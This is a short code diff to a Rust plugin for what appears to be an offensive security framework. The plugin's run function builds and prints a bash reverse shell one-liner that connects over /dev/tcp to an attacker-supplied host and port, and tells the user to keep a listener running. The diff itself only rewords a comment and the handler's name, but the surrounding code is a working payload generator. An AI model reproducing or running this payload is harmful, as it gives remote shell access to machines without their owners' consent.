@@ -114,7 +114,7 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
     let bash_path = options.bash_path.unwrap_or_else(|| "bash".to_string());
     let shell_path = options.shell_path.unwrap_or_else(|| "sh".to_string());
 
-    // Use random file descriptor like Metasploit does (20-219)
+    // Use random file descriptor (20-219)
     let fd: u32 = rand::thread_rng().gen_range(20..220);
 
     // Generate the bash reverse shell payload
@@ -130,7 +130,7 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
     println!("\n[*] Alternative (simpler, no semicolons):");
     println!("{} {}<>/dev/tcp/{}/{} <&{} >&{}", bash_path, fd, lhost, lport, fd, fd);
     println!("\n[*] Note: Requires bash compiled with /dev/tcp support");
-    println!("[*] Ensure handler is listening: use exploit/multi/handler");
+    println!("[*] Ensure handler is listening: use utilities/multi_handler");
 
     0
 }
